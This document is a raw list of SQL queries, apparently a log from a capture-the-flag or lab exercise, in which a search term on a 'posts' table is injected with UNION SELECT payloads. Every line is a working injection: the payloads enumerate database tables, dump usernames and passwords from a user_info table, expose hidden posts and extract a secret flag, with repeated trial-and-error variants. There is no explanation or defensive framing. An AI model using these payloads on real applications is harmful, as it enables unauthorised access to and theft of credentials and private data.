SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT table_name, null, null FROM information_schema.tables --%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT name, passwd, null FROM user_info ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null,name, passwd, null FROM user_info ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, name, passwd, null FROM user_info ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, name, passwd FROM user_info ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, title, content FROM posts WHERE is_hidden = 1 ; --%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, name, passwd FROM user_info ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, name, passwd FROM user_info ;--%' AND is_hidden = FALSE
SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, id, flag FROM flags WHERE is_secret = TRUE ;--%' AND is_hidden = FALSE
